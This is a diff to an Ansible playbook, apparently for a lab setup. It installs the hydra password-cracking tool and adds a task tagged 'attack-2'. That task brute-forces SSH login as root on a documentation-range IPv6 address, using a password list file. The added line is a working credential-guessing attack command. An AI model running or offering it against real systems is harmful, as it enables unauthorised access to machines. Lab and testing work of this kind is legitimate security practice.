@@ -3,8 +3,6 @@
    any_errors_fatal: true
    gather_facts: no
 
-
-
    tasks:
    - name: Update the machine
      tags: upd
@@ -125,3 +123,9 @@
        make install
      args:
        chdir: /root/hydra
+
+   - name: brut force the target with list of passwords.
+     tags: attack-2
+     shell: |
+       hydra -s 22 -V -l root -P /files/pw-list.txt -t 10 -f 2001:db8:0:1::1 ssh
+    
